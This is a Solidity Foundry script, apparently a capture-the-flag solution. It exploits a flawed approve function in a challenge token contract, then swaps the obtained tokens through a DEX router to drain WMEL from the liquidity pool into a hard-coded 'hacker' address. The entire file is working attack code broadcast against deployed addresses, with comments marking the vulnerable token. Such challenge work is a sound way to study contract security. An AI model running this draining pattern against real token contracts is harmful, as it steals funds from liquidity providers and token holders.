// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/chall02/chall02.sol";
import "../../src/DexFiles/Library.sol";

import "forge-std/console.sol";

contract ExploitScript is Script {

    //address hacker = vm.addr(1);
    address wmel = 0x8Bc7681Af6707f26F401BA3343f96Ed08Ff50B68;
    address _target = 0x7103398EB249d6AD61C4532cEdc2b850ea079880;
    address _factory = 0x2F581c5117735E3a49046Da2500bD0c3733981AA;
    address _router = 0x9ac8302B92EfAd680231a0b3F3a0b7D5B1e88c44;
    address hacker = 0x4329F1B7622Cfab7FdBc49A52b460889433eF316;

    hero2302 public target;
    //WMEL public wmel;
    IKwikEFactory public factory;
    IKwikEPair public kpair;
    IKwikERouter02 public router;
    function setUp() public {
        target = hero2302(_target);
        factory = IKwikEFactory(_factory);
        router = IKwikERouter02(_router);
    }

    function run() public {
        vm.startBroadcast();
        
        address[] memory t = new address[](2);
        t[0] = address(target);
        t[1] = wmel;

        uint valueOut = 19550000000000000000;

        uint[] memory amountsIn = router.getAmountsIn(valueOut,t);
        uint hackamount = amountsIn[0];
        target.approve(hackamount);

        target.approve(address(router),hackamount);
 
        router.swapExactTokensForTokens(hackamount,0,t,hacker,block.timestamp+2 days);

        kpair = IKwikEPair(factory.getPair(address(target),wmel));
        (uint112 amount00, uint112 amount01,) = kpair.getReserves();
        console.log("erc20 in reserve : ",amount00,"addr 0 : ",kpair.token0()); //erc20 vulnerable
        console.log("Wmel in reserve : ",amount01,"addr 1 : ",kpair.token1()); //Wmel
        
        vm.stopBroadcast();
    }
}
